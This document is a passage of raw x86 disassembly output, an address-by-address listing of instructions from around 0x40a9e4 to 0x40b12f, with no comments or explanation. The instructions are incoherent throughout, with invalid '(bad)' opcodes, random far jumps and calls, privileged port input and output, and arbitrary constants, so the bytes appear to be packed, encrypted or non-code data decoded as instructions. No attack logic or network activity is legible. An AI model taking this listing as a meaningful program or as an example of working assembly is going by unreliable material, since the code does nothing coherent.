  40a9e4:	add    al,0xff
  40a9e6:	push   ebp
  40a9e7:	sbb    bh,0xec
  40a9ea:	xchg   edi,eax
  40a9eb:	sbb    esp,esp
  40a9ed:	jecxz  0x40a984
  40a9ef:	inc    eax
  40a9f0:	mov    dh,0x3b
  40a9f2:	or     BYTE PTR [ecx+0x233830c5],0x8d
  40a9f9:	mov    dh,0x5
  40a9fb:	call   0xafab6124
  40aa00:	mov    al,0x2d
  40aa02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa03:	mov    ch,0xc5
  40aa05:	xchg   ebx,eax
  40aa06:	dec    esp
  40aa07:	xor    BYTE PTR [ecx],0xf4
  40aa0a:	inc    eax
  40aa0b:	fnstsw WORD PTR [esi]
  40aa0d:	adc    BYTE PTR [edi+0x1927abbf],bh
  40aa13:	pop    edi
  40aa14:	and    al,0x12
  40aa16:	fwait
  40aa17:	in     eax,0xb1
  40aa19:	mov    ebx,0x7223a2a6
  40aa1e:	clc    
  40aa1f:	and    al,0xb2
  40aa21:	ja     0x40aa54
  40aa23:	ss into 
  40aa25:	lahf   
  40aa26:	jae    0x40aa48
  40aa28:	sub    ecx,DWORD PTR [ebp+0x73]
  40aa2b:	test   BYTE PTR [edx],bh
  40aa2d:	dec    ecx
  40aa2e:	dec    eax
  40aa2f:	xchg   esp,eax
  40aa30:	stos   DWORD PTR es:[edi],eax
  40aa31:	push   cs
  40aa32:	imul   BYTE PTR [edi]
  40aa34:	xor    eax,0x67fdadb3
  40aa39:	nop
  40aa3a:	mov    ds:0x61213482,eax
  40aa3f:	cmp    edi,edx
  40aa41:	xor    DWORD PTR [ecx],0x5a
  40aa44:	js     0x40aa42
  40aa46:	cmp    eax,0xc98388ea
  40aa4b:	push   edx
  40aa4c:	jmp    0x71bc0ecd
  40aa51:	jno    0x40aa52
  40aa53:	fstp   TBYTE PTR [edx-0x6f]
  40aa56:	push   edi
  40aa57:	xchg   esp,eax
  40aa58:	mov    bh,BYTE PTR [ebx+0x5bcbd339]
  40aa5e:	pop    eax
  40aa5f:	in     al,0xe0
  40aa61:	jnp    0x40aa19
  40aa63:	ins    BYTE PTR es:[edi],dx
  40aa64:	pop    edx
  40aa65:	dec    ebp
  40aa66:	jo     0x40aae4
  40aa68:	test   DWORD PTR [eax+ecx*1-0x1e410d8],ebx
  40aa6f:	jo     0x40aa8d
  40aa71:	adc    ebp,DWORD PTR [esi]
  40aa73:	mov    esp,0xbb57d68
  40aa78:	shl    DWORD PTR [ebx],cl
  40aa7a:	jnp    0x40aa17
  40aa7c:	retf   
  40aa7d:	rcl    DWORD PTR [edx+ebx*4+0x3cc267b8],1
  40aa84:	or     edx,edx
  40aa86:	add    DWORD PTR [ecx+0x5653e4f3],0x72b32d76
  40aa90:	js     0x40aab5
  40aa92:	aas    
  40aa93:	or     eax,0xbe4816a5
  40aa98:	dec    esi
  40aa99:	adc    esp,ebx
  40aa9b:	iret   
  40aa9c:	or     BYTE PTR ds:0x6c6d58ef,0x20
  40aaa3:	push   ecx
  40aaa4:	add    eax,0xddbc8e81
  40aaa9:	mov    al,ds:0x8ac611a8
  40aaae:	fisub  DWORD PTR [esi+0x76]
  40aab1:	inc    eax
  40aab2:	mov    edx,0x40db7acb
  40aab7:	rep lods eax,DWORD PTR ds:[esi]
  40aab9:	inc    ebx
  40aaba:	and    DWORD PTR [ebp-0x11],esi
  40aabd:	or     eax,0xe9ae29f0
  40aac2:	fwait
  40aac3:	inc    ebx
  40aac4:	and    DWORD PTR [ebp-0x677476a6],0x5
  40aacb:	repnz retf 
  40aacd:	pop    ss
  40aace:	xlat   BYTE PTR ds:[ebx]
  40aacf:	mov    DWORD PTR [ebx-0x46b2bdb5],edx
  40aad5:	push   0xffffffc1
  40aad7:	aas    
  40aad8:	cmp    al,0x56
  40aada:	gs push eax
  40aadc:	mov    eax,ds:0x60b51699
  40aae1:	fcmovnu st,st(0)
  40aae3:	mov    al,ds:0xc9d6e5be
  40aae8:	sub    eax,0x5ffab8b1
  40aaed:	xor    DWORD PTR [esi+ecx*4],0x2dcba00b
  40aaf4:	push   cs
  40aaf5:	scas   eax,DWORD PTR es:[edi]
  40aaf6:	inc    ecx
  40aaf7:	rcr    BYTE PTR [esi-0x50],0x34
  40aafb:	repnz loop 0x40aac1
  40aafe:	ins    DWORD PTR es:[edi],dx
  40aaff:	sub    bh,BYTE PTR [edi-0x79]
  40ab02:	icebp  
  40ab03:	mov    edx,0x504ffcd4
  40ab08:	int    0x47
  40ab0a:	jbe    0x40ab4f
  40ab0c:	test   BYTE PTR [eax+0x1],dl
  40ab0f:	outs   dx,BYTE PTR ds:[esi]
  40ab10:	mov    bh,0x66
  40ab12:	mov    ch,BYTE PTR [ecx+0x33]
  40ab15:	sbb    eax,0xcd6e9fc2
  40ab1a:	dec    eax
  40ab1b:	cwde   
  40ab1c:	rep outs dx,DWORD PTR ds:[esi]
  40ab1e:	psubsb mm3,QWORD PTR [edx]
  40ab21:	or     al,0xd6
  40ab23:	jne    0x40ab70
  40ab25:	test   DWORD PTR [edx],eax
  40ab27:	mov    ebx,0xaba8f90c
  40ab2c:	mov    esi,0x21948b48
  40ab31:	dec    esi
  40ab32:	add    eax,0xd816722a
  40ab37:	mov    eax,0x92e3f25b
  40ab3c:	pop    ds
  40ab3d:	je     0x40ab9d
  40ab3f:	pop    esp
  40ab40:	mov    esp,0x8a6310d5
  40ab45:	push   ecx
  40ab46:	dec    eax
  40ab47:	(bad)  
  40ab49:	mov    dh,0x21
  40ab4b:	ds push ebx
  40ab4d:	cwde   
  40ab4e:	sub    al,0xe6
  40ab50:	sahf   
  40ab51:	and    edi,edx
  40ab53:	out    dx,eax
  40ab54:	out    0xcb,eax
  40ab56:	dec    eax
  40ab57:	mov    ch,0x3
  40ab59:	cmp    cl,dh
  40ab5b:	and    ecx,ebp
  40ab5d:	push   ecx
  40ab5e:	push   es
  40ab5f:	pop    ecx
  40ab60:	jp     0x40ab5a
  40ab62:	neg    esi
  40ab64:	jecxz  0x40ab5c
  40ab66:	or     bh,0x89
  40ab69:	mov    ebx,esp
  40ab6b:	add    eax,0x25d2edac
  40ab70:	ds pop ds
  40ab72:	imul   eax,DWORD PTR [eax+0x52],0xd044d279
  40ab79:	subps  xmm6,XMMWORD PTR [esi+0x66ad5369]
  40ab80:	or     cl,BYTE PTR [eax+0x6b]
  40ab83:	cs xchg ebp,eax
  40ab85:	shr    DWORD PTR [edi-0x28],0x3a
  40ab89:	jge    0x40ab22
  40ab8b:	pop    ebx
  40ab8c:	out    0x94,eax
  40ab8e:	sbb    DWORD PTR [esi+0x7c2ab6b5],eax
  40ab94:	mov    eax,0xb48ec2ce
  40ab99:	sar    esi,1
  40ab9b:	add    DWORD PTR [esi+0x50],esp
  40ab9e:	mul    DWORD PTR [ebx]
  40aba0:	or     al,0xc3
  40aba2:	int3   
  40aba3:	lods   al,BYTE PTR ds:[esi]
  40aba4:	xchg   esp,eax
  40aba5:	push   es
  40aba6:	dec    ebx
  40aba7:	sti    
  40aba8:	and    edx,ecx
  40abaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abab:	sbb    ebp,DWORD PTR [edx]
  40abad:	out    0xd7,al
  40abaf:	sar    BYTE PTR [edi-0x19],0xc5
  40abb3:	test   BYTE PTR es:[eax+0x3953818d],0x40
  40abbb:	sub    al,0x45
  40abbd:	cmp    dh,BYTE PTR [eax+0xf]
  40abc0:	sbb    dh,BYTE PTR [ecx-0x990cf6d]
  40abc6:	dec    ebx
  40abc7:	jnp    0x40ac48
  40abc9:	jp     0x40ab4f
  40abcb:	mov    al,BYTE PTR [edx+0x185e1a49]
  40abd1:	repnz gs retf 0xf257
  40abd6:	ror    DWORD PTR [ecx-0xe],0xca
  40abda:	fwait
  40abdb:	adc    eax,0x89073b7a
  40abe0:	mov    dl,BYTE PTR [edi+ebp*8+0x17]
  40abe4:	fcomip st,st(7)
  40abe6:	and    esp,DWORD PTR [ecx+0x2c]
  40abe9:	mov    ebp,0x9b819601
  40abee:	jmp    0xfa4d:0x9ecf0397
  40abf5:	adc    DWORD PTR [edx+edi*1-0x74],ecx
  40abf9:	shl    BYTE PTR [edx],cl
  40abfb:	pop    es
  40abfc:	ss or  eax,0xc5d1f835
  40ac02:	ins    BYTE PTR es:[edi],dx
  40ac03:	inc    edx
  40ac04:	call   0x6db4dbdd
  40ac09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac0a:	pop    esp
  40ac0b:	lods   eax,DWORD PTR ds:[esi]
  40ac0c:	xchg   ebx,eax
  40ac0d:	ror    BYTE PTR gs:[edx+0x7a],1
  40ac11:	sub    BYTE PTR [edx+0x73],dh
  40ac14:	cmp    esp,esp
  40ac16:	outs   dx,BYTE PTR ds:[esi]
  40ac17:	fstp   QWORD PTR [esi+0x7a6dfbf9]
  40ac1d:	iret   
  40ac1e:	mov    WORD PTR ds:0x760ddad0,ds
  40ac24:	and    al,0x47
  40ac26:	int    0xb6
  40ac28:	xor    edi,ebp
  40ac2a:	stos   BYTE PTR es:[edi],al
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	sbb    eax,0x653c6b2a
  40ac31:	out    dx,eax
  40ac32:	gs clc 
  40ac34:	mov    ebp,0x4a76910d
  40ac39:	adc    eax,ebp
  40ac3b:	leave  
  40ac3c:	pop    ebp
  40ac3d:	push   cs
  40ac3e:	sbb    eax,0xede8aad8
  40ac43:	fsub   QWORD PTR [ebx+0x7a]
  40ac46:	rcl    ebx,0x74
  40ac49:	cmc    
  40ac4a:	mov    edi,0xe02adbcc
  40ac4f:	outs   dx,DWORD PTR ds:[esi]
  40ac50:	mov    al,0x5
  40ac52:	add    DWORD PTR [edi],eax
  40ac54:	cld    
  40ac55:	call   0x6f3c4ea8
  40ac5a:	(bad)  
  40ac5b:	sbb    eax,0xf9306cf7
  40ac60:	inc    ecx
  40ac61:	jecxz  0x40acb0
  40ac63:	(bad)  
  40ac64:	ror    DWORD PTR [eax],1
  40ac66:	or     eax,0xc2c889cf
  40ac6b:	out    dx,al
  40ac6c:	push   esp
  40ac6d:	adc    bl,BYTE PTR [ebx]
  40ac6f:	xor    al,0xc6
  40ac71:	jg     0x40ac25
  40ac73:	or     eax,0x1137ad4d
  40ac78:	leave  
  40ac79:	push   esi
  40ac7a:	out    0x3d,eax
  40ac7c:	xchg   BYTE PTR [edx],bh
  40ac7e:	sub    ch,BYTE PTR [eax]
  40ac80:	mov    esi,0xc7e577e8
  40ac85:	pop    ss
  40ac86:	mov    ds:0xa542c6d7,al
  40ac8b:	aas    
  40ac8c:	clc    
  40ac8d:	(bad)  
  40ac8f:	lods   al,BYTE PTR ds:[esi]
  40ac90:	cmp    al,0x65
  40ac92:	mov    ebx,0xba8c1d4d
  40ac97:	push   eax
  40ac98:	imul   esi,edx,0xffffffc4
  40ac9b:	fadd   DWORD PTR [edi-0xa]
  40ac9e:	adc    BYTE PTR [ecx+0x3d],dh
  40aca1:	sub    BYTE PTR [eax+0x2125554],cl
  40aca7:	stos   DWORD PTR es:[edi],eax
  40aca8:	out    dx,al
  40aca9:	jge    0x40acbf
  40acab:	iret   
  40acac:	in     al,0x9a
  40acae:	(bad)  
  40acaf:	and    edx,DWORD PTR [ebx]
  40acb1:	loope  0x40acc0
  40acb3:	sbb    ecx,DWORD PTR [esi-0x35496cac]
  40acb9:	lods   eax,DWORD PTR ds:[esi]
  40acba:	mov    edi,0xa21e9656
  40acbf:	popf   
  40acc0:	call   0xeb90:0xa7e8e2ed
  40acc7:	popa   
  40acc8:	inc    edx
  40acc9:	in     eax,0x3b
  40accb:	jmp    0xbd5087ec
  40acd0:	lods   al,BYTE PTR ds:[esi]
  40acd1:	loopne 0x40ad35
  40acd3:	sub    DWORD PTR [eax],esi
  40acd5:	aad    0x46
  40acd7:	sbb    al,0x29
  40acd9:	mov    ch,0xd8
  40acdb:	shl    BYTE PTR [esi-0x4f],0xc8
  40acdf:	lahf   
  40ace0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ace1:	adc    eax,0x621cee31
  40ace6:	mov    bl,0x12
  40ace8:	jno    0x40acaf
  40acea:	or     BYTE PTR [edi+0x13b67123],cl
  40acf0:	hlt    
  40acf1:	fmul   QWORD PTR [ebx]
  40acf3:	retf   0xc23c
  40acf6:	lods   al,BYTE PTR ds:[esi]
  40acf7:	retf   
  40acf8:	push   ebp
  40acf9:	push   ds
  40acfa:	or     al,0xa4
  40acfc:	(bad)  
  40acfd:	push   edi
  40acfe:	xchg   ebx,eax
  40acff:	int    0x34
  40ad01:	fst    DWORD PTR [edx-0x3bd7ff3b]
  40ad07:	imul   ebx,DWORD PTR [edx],0x1cf78658
  40ad0d:	ja     0x40ad5e
  40ad0f:	push   ebx
  40ad10:	jno    0x40acce
  40ad12:	inc    ebx
  40ad13:	jg     0x40acad
  40ad15:	in     eax,dx
  40ad16:	shl    DWORD PTR [esi],cl
  40ad18:	aam    0x37
  40ad1a:	and    eax,0x7621b2ac
  40ad1f:	dec    esi
  40ad20:	mov    ecx,edx
  40ad22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad23:	mov    bl,BYTE PTR [edi]
  40ad25:	call   0x50aff6
  40ad2a:	shl    esi,1
  40ad2c:	push   0xa8eab6e9
  40ad31:	jge    0x40acc6
  40ad33:	inc    esi
  40ad34:	cli    
  40ad35:	sahf   
  40ad36:	dec    ecx
  40ad37:	fsub   QWORD PTR ds:[ebp+0x6c]
  40ad3b:	pop    eax
  40ad3c:	adc    al,0xf
  40ad3e:	addr16 pop es
  40ad40:	call   0xbf05:0x1c4af464
  40ad47:	fld    TBYTE PTR [ebx]
  40ad49:	test   DWORD PTR [esi-0x48],edi
  40ad4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad4d:	xlat   BYTE PTR ds:[ebx]
  40ad4e:	lea    eax,ds:0xf30771b
  40ad54:	mov    bh,0x80
  40ad56:	popf   
  40ad57:	xchg   ebx,eax
  40ad58:	test   eax,0xcda32b0a
  40ad5d:	adc    al,0x81
  40ad5f:	lahf   
  40ad60:	mov    ch,0x65
  40ad62:	js     0x40ad51
  40ad64:	(bad)  
  40ad65:	je     0x40ad3a
  40ad67:	xchg   edx,eax
  40ad68:	loope  0x40ad39
  40ad6a:	cmp    al,0x93
  40ad6c:	mov    edi,0xb1144ac4
  40ad71:	rcr    BYTE PTR [ebx+0x13],cl
  40ad74:	jecxz  0x40ad90
  40ad76:	mov    cl,0x6c
  40ad78:	mov    dh,0x10
  40ad7a:	loopne 0x40ad86
  40ad7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad7d:	jge    0x40ad7a
  40ad7f:	je     0x40ad1f
  40ad81:	cmp    bh,dh
  40ad83:	pmaxsw mm5,QWORD PTR [ecx-0x3f]
  40ad87:	xchg   ebp,eax
  40ad88:	xor    DWORD PTR ds:0xc237d305,ebx
  40ad8e:	dec    esi
  40ad8f:	xor    ebx,esp
  40ad91:	stos   BYTE PTR es:[edi],al
  40ad92:	dec    edx
  40ad93:	in     al,dx
  40ad94:	sub    al,0xb6
  40ad96:	jne    0x40adb1
  40ad98:	mov    dh,0x96
  40ad9a:	add    esp,ebp
  40ad9c:	inc    esi
  40ad9d:	pop    ebp
  40ad9e:	pop    ss
  40ad9f:	dec    eax
  40ada0:	push   ss
  40ada1:	cld    
  40ada2:	or     ecx,DWORD PTR [ecx-0x71e73a05]
  40ada8:	retf   0x20a9
  40adab:	hlt    
  40adac:	add    dh,bl
  40adae:	bswap  edx
  40adb0:	jns    0x40ad9e
  40adb2:	test   al,0xf9
  40adb4:	aaa    
  40adb5:	jnp    0x40ad54
  40adb7:	stc    
  40adb8:	mov    esp,0x220aee1c
  40adbd:	xor    eax,0x27b1ab9a
  40adc2:	fadd   st(2),st
  40adc4:	mov    al,0x16
  40adc6:	cs pop edx
  40adc8:	adc    ah,BYTE PTR [edi+0x7]
  40adcb:	scas   eax,DWORD PTR es:[edi]
  40adcc:	aaa    
  40adcd:	push   ebp
  40adce:	cmp    BYTE PTR [ebx],bl
  40add0:	xchg   ecx,eax
  40add1:	hlt    
  40add2:	push   es
  40add3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add4:	inc    ebx
  40add5:	inc    ebp
  40add6:	cmp    bl,dh
  40add8:	and    al,0x91
  40adda:	in     al,dx
  40addb:	mov    WORD PTR [edx+0x2f],gs
  40adde:	pop    ebp
  40addf:	cmc    
  40ade0:	cmp    BYTE PTR [ebx-0x15],ah
  40ade3:	je     0x40ad93
  40ade5:	inc    eax
  40ade6:	push   0x77eb4813
  40adeb:	and    al,0x5d
  40aded:	add    edi,edx
  40adef:	and    al,0x68
  40adf1:	jne    0x40ad8f
  40adf3:	in     al,0xa
  40adf5:	push   ebx
  40adf6:	(bad)  
  40adf8:	ficomp DWORD PTR [ebx]
  40adfa:	push   bx
  40adfc:	inc    esp
  40adfd:	mov    cl,0x57
  40adff:	aas    
  40ae00:	push   esp
  40ae01:	data16 and BYTE PTR [ecx],0x5
  40ae05:	retf   0xa56e
  40ae08:	sar    edx,1
  40ae0a:	scas   al,BYTE PTR es:[edi]
  40ae0b:	(bad)  
  40ae0c:	fdiv   QWORD PTR [esi+0x430012f4]
  40ae12:	adc    BYTE PTR [esp+edi*1],al
  40ae15:	sahf   
  40ae16:	push   esi
  40ae17:	int3   
  40ae18:	push   es
  40ae19:	and    edx,edi
  40ae1b:	mov    eax,ds:0xd140205
  40ae20:	shl    BYTE PTR [eax-0x46721db9],0xdd
  40ae27:	adc    ebp,DWORD PTR [edi+edi*1]
  40ae2a:	inc    edx
  40ae2b:	dec    edi
  40ae2c:	jmp    0xda55:0x3fc66338
  40ae33:	mov    eax,0xb0b8861f
  40ae38:	sub    ecx,DWORD PTR es:[edx+ebx*2-0x63cef882]
  40ae40:	mov    esp,0x6609e529
  40ae45:	es (bad) 
  40ae47:	jp     0x40ae2d
  40ae49:	rcl    ecx,0xe3
  40ae4c:	inc    edi
  40ae4d:	adc    eax,0x56822052
  40ae52:	cdq    
  40ae53:	jb     0x40ae2f
  40ae55:	(bad)  
  40ae56:	push   cs
  40ae57:	imul   ebx,DWORD PTR [edi-0xa73b248],0x7f
  40ae5e:	xchg   ebp,eax
  40ae5f:	call   0x211f62be
  40ae64:	pusha  
  40ae65:	push   esi
  40ae66:	rcr    DWORD PTR [ecx-0x5a06e739],1
  40ae6c:	jle    0x40ae3b
  40ae6e:	out    dx,eax
  40ae6f:	or     eax,0xf579677e
  40ae74:	call   0xb9ec:0x90ae2ce2
  40ae7b:	jge    0x40ae37
  40ae7d:	aaa    
  40ae7e:	pop    ebp
  40ae7f:	add    dh,ch
  40ae81:	add    eax,0xd135b1a7
  40ae86:	mov    ebx,DWORD PTR [eax]
  40ae88:	outs   dx,BYTE PTR ds:[esi]
  40ae89:	std    
  40ae8a:	jg     0x40ae0e
  40ae8c:	stc    
  40ae8d:	adc    dh,cl
  40ae8f:	fidivr WORD PTR [esi-0x7d]
  40ae92:	mov    ebp,0x757f9144
  40ae97:	call   0x79061a1e
  40ae9c:	lea    esp,[ebp+0x6]
  40ae9f:	sbb    eax,0x4f0b2103
  40aea4:	jl     0x40ae5c
  40aea6:	mov    cl,0x1d
  40aea8:	push   ebx
  40aea9:	stc    
  40aeaa:	les    esp,FWORD PTR [edi+ecx*2+0x5bb51630]
  40aeb1:	loope  0x40aee0
  40aeb3:	or     eax,0xe47c3f96
  40aeb8:	add    ebp,DWORD PTR [ebx]
  40aeba:	bound  esp,QWORD PTR [ecx-0x2ba5c2d9]
  40aec0:	mov    eax,ds:0x3f97e79a
  40aec5:	sbb    ebx,esi
  40aec7:	sti    
  40aec8:	lock sbb DWORD PTR [esi-0x7],edi
  40aecc:	jle    0x40aed8
  40aece:	test   BYTE PTR [ebx-0x4f7253da],cl
  40aed4:	out    dx,al
  40aed5:	or     ecx,DWORD PTR [ecx+ebx*4+0x53]
  40aed9:	mov    ah,0xa0
  40aedb:	add    DWORD PTR [edx],ecx
  40aedd:	mov    esi,0xafa3a7e2
  40aee2:	jg     0x40af56
  40aee4:	jb     0x40ae86
  40aee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aee7:	jmp    0x38237e65
  40aeec:	xchg   edi,eax
  40aeed:	lods   al,BYTE PTR ds:[esi]
  40aeee:	pop    esp
  40aeef:	nop
  40aef0:	ds cld 
  40aef2:	(bad)  
  40aef3:	jg     0x40af5d
  40aef5:	xchg   BYTE PTR [eax+0x293f1de1],bl
  40aefb:	icebp  
  40aefc:	sbb    bl,dh
  40aefe:	idiv   DWORD PTR [esi]
  40af00:	pushf  
  40af01:	adc    cl,bl
  40af03:	shl    DWORD PTR ds:0xc8343f5,cl
  40af09:	fdivp  st(4),st
  40af0b:	xor    al,0xb8
  40af0d:	lds    edi,FWORD PTR [edi-0x4023c3]
  40af13:	mov    dh,0x36
  40af15:	in     eax,dx
  40af16:	outs   dx,BYTE PTR ds:[esi]
  40af17:	and    DWORD PTR ds:0x4942e97c,esp
  40af1d:	xchg   esi,eax
  40af1e:	clc    
  40af1f:	ss jb  0x40af4b
  40af22:	bound  esi,QWORD PTR [edx]
  40af24:	sub    eax,0x4c62ffb3
  40af29:	or     eax,ebx
  40af2b:	mov    DWORD PTR ds:0x6f3d914,edx
  40af31:	(bad)  
  40af32:	(bad)  
  40af33:	mov    ds:0xe33ed3fe,eax
  40af38:	daa    
  40af39:	xor    esi,DWORD PTR [edi]
  40af3b:	das    
  40af3c:	add    DWORD PTR [edx-0x7522ec34],ebp
  40af42:	rcl    BYTE PTR [ebp-0x2dd762ac],cl
  40af48:	or     al,BYTE PTR [ecx]
  40af4a:	stos   BYTE PTR es:[edi],al
  40af4b:	xchg   esi,eax
  40af4c:	scas   al,BYTE PTR es:[edi]
  40af4d:	loope  0x40af4a
  40af4f:	dec    edx
  40af50:	mov    bh,0x51
  40af52:	aaa    
  40af53:	sub    DWORD PTR [edx],0x51
  40af56:	sub    edx,ebp
  40af58:	rcl    DWORD PTR [esi+0x69779f83],0x84
  40af5f:	dec    edx
  40af60:	icebp  
  40af61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af62:	pusha  
  40af63:	add    al,0x6
  40af65:	mov    ebp,0x620694fb
  40af6a:	out    dx,eax
  40af6b:	arpl   WORD PTR [eax-0x77a1a041],bp
  40af71:	sub    BYTE PTR [edi+0x7a],cl
  40af74:	jne    0x40afd7
  40af76:	push   0xffffffaa
  40af78:	inc    edx
  40af79:	ds fmul st,st(7)
  40af7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af7d:	dec    esp
  40af7e:	fwait
  40af7f:	ins    DWORD PTR es:[edi],dx
  40af80:	add    eax,0x1b29e824
  40af85:	call   0xc407:0x75bf77f1
  40af8c:	out    dx,al
  40af8d:	mov    dl,0xe0
  40af8f:	es pop ebx
  40af91:	sahf   
  40af92:	arpl   WORD PTR [esi+0x55],bp
  40af95:	dec    ebp
  40af96:	xor    ch,BYTE PTR [ebp-0x3fbf039]
  40af9c:	mov    edi,DWORD PTR [eax]
  40af9e:	inc    ebx
  40af9f:	xchg   ebp,eax
  40afa0:	mov    ecx,0xa5b74b93
  40afa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa6:	mov    ecx,0x7c4ee156
  40afab:	gs cli 
  40afad:	sbb    eax,0xae4ec79a
  40afb2:	mov    BYTE PTR [esi-0x2c0fa1bc],dl
  40afb8:	ror    DWORD PTR [ebx+edx*4+0x7c94ac3c],0x59
  40afc0:	ins    BYTE PTR es:[edi],dx
  40afc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc2:	stos   DWORD PTR es:[edi],eax
  40afc3:	jmp    0x7481:0xf9ecd7bd
  40afca:	sub    ebp,DWORD PTR [ebp+0x77]
  40afcd:	mov    cl,0x3
  40afcf:	out    0x76,al
  40afd1:	fstp   QWORD PTR [ecx-0x66f543b6]
  40afd7:	push   es
  40afd8:	or     BYTE PTR [eax-0x6c4c2c01],dl
  40afde:	stc    
  40afdf:	adc    dh,BYTE PTR [eax+0x33ee6a6e]
  40afe5:	rcl    BYTE PTR [esi],0x83
  40afe8:	adc    BYTE PTR [eax+eiz*1],ch
  40afeb:	rcr    DWORD PTR [edi-0x267f3eed],1
  40aff1:	fs test ebp,eax
  40aff4:	xlat   BYTE PTR ds:[ebx]
  40aff5:	dec    edx
  40aff6:	xchg   esi,eax
  40aff7:	or     BYTE PTR [esp+ebp*8+0x45],ah
  40affb:	pshufw mm3,QWORD PTR [eax],0x6e
  40afff:	aaa    
  40b000:	and    bh,BYTE PTR [edi+eiz*8]
  40b003:	inc    edi
  40b004:	jns    0x40afb3
  40b006:	jae    0x40afe1
  40b008:	dec    eax
  40b009:	cmp    eax,0x4a4d1085
  40b00e:	cld    
  40b00f:	jecxz  0x40afe2
  40b011:	mov    cl,BYTE PTR [edx]
  40b013:	mov    al,ds:0x58533704
  40b018:	add    DWORD PTR [ebx+0x69],0x22cf958e
  40b01f:	gs aaa 
  40b021:	(bad)  
  40b023:	jbe    0x40b09a
  40b025:	adc    eax,DWORD PTR [ebx-0x4a]
  40b028:	mov    DWORD PTR [ecx-0x26],edi
  40b02b:	inc    esp
  40b02c:	in     al,dx
  40b02d:	das    
  40b02e:	inc    edi
  40b02f:	jecxz  0x40b04c
  40b031:	cvttps2pi mm1,QWORD PTR [ebp-0x23]
  40b035:	rcr    DWORD PTR [eax-0x68],cl
  40b038:	pop    ecx
  40b039:	test   al,0x5b
  40b03b:	and    DWORD PTR [edx],edx
  40b03d:	jl     0x40b01d
  40b03f:	das    
  40b040:	inc    ebx
  40b041:	mov    al,ds:0xf7ba0490
  40b046:	dec    edx
  40b047:	xchg   ecx,eax
  40b048:	jb     0x40b086
  40b04a:	das    
  40b04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b04c:	test   al,0x16
  40b04e:	in     al,0x4d
  40b050:	fsubrp st(4),st
  40b052:	push   cs
  40b053:	and    eax,0xbc7d78c2
  40b058:	(bad)  
  40b059:	rcr    DWORD PTR cs:[esi],0x8d
  40b05d:	lods   al,BYTE PTR ds:[esi]
  40b05e:	test   al,0x45
  40b060:	fwait
  40b061:	mov    eax,0x19db18cc
  40b066:	aaa    
  40b067:	mov    ch,0x1d
  40b069:	push   ecx
  40b06a:	add    ecx,edi
  40b06c:	pop    ebx
  40b06d:	popf   
  40b06e:	push   ebx
  40b06f:	gs dec eax
  40b071:	ins    BYTE PTR es:[edi],dx
  40b072:	xchg   ebx,eax
  40b073:	jbe    0x40b05f
  40b075:	inc    ecx
  40b076:	ret    
  40b077:	subps  xmm1,XMMWORD PTR [ecx+0x21]
  40b07b:	in     al,dx
  40b07c:	inc    edx
  40b07d:	out    0x86,eax
  40b07f:	dec    ebx
  40b080:	adc    edi,esp
  40b082:	inc    edx
  40b083:	xor    cl,bl
  40b085:	mov    ds:0x950ca787,al
  40b08a:	outs   dx,DWORD PTR ds:[esi]
  40b08b:	xchg   ebp,eax
  40b08c:	dec    edx
  40b08d:	int3   
  40b08e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08f:	mov    ebp,0x872df81d
  40b094:	shr    ch,1
  40b096:	inc    eax
  40b097:	push   edi
  40b098:	pop    ds
  40b099:	test   bl,bh
  40b09b:	pusha  
  40b09c:	mov    al,0xa
  40b09e:	and    eax,0x2fd81078
  40b0a3:	pop    edi
  40b0a4:	pop    ebx
  40b0a5:	xchg   ecx,esi
  40b0a7:	mov    dl,0x1d
  40b0a9:	adc    BYTE PTR [edi-0x56],al
  40b0ac:	lods   eax,DWORD PTR ds:[esi]
  40b0ad:	pop    esp
  40b0ae:	and    al,0x87
  40b0b0:	call   0xd134fef4
  40b0b5:	pushf  
  40b0b6:	jae    0x40b0c2
  40b0b8:	mov    ch,0xf5
  40b0ba:	lahf   
  40b0bb:	arpl   si,bx
  40b0bd:	xor    dl,BYTE PTR [ecx+0x4ad8d1f6]
  40b0c3:	pop    edx
  40b0c4:	mov    al,BYTE PTR [esi+0x58ac6cbe]
  40b0ca:	out    dx,eax
  40b0cb:	push   ds
  40b0cc:	jg     0x40b0e9
  40b0ce:	adc    bl,BYTE PTR [edx+0x67bf06c1]
  40b0d4:	mov    dh,0xc4
  40b0d6:	ret    0x8c3f
  40b0d9:	aad    0x93
  40b0db:	ss xor bl,ch
  40b0de:	mov    DWORD PTR [edx+0x78],edi
  40b0e1:	fisubr DWORD PTR [edx-0x1c7a6163]
  40b0e7:	(bad)  
  40b0e8:	dec    esp
  40b0e9:	sbb    al,0x8d
  40b0eb:	stc    
  40b0ec:	int    0x7b
  40b0ee:	sar    BYTE PTR [edi-0x3e03114a],0x2e
  40b0f5:	ror    ch,cl
  40b0f7:	call   0xc6d1c009
  40b0fc:	jnp    0x40b0c9
  40b0fe:	mov    dh,0x78
  40b100:	or     esp,DWORD PTR [edi+0x50]
  40b103:	push   cs
  40b104:	jp     0x40b110
  40b106:	jmp    0xc9bd:0x906fae55
  40b10d:	cmc    
  40b10e:	outs   dx,DWORD PTR ds:[esi]
  40b10f:	jg     0x40b102
  40b111:	jb     0x40b0b6
  40b113:	shl    BYTE PTR [edi],cl
  40b115:	and    eax,esp
  40b117:	ins    BYTE PTR es:[edi],dx
  40b118:	lahf   
  40b119:	xor    ah,BYTE PTR es:[edi-0x6c89d815]
  40b120:	xlat   BYTE PTR ds:[ebx]
  40b121:	jmp    0xdd86010
  40b126:	push   0xbafbdfa7
  40b12b:	not    DWORD PTR [eax+0x57]
  40b12e:	inc    edx
  40b12f:	dec    ecx
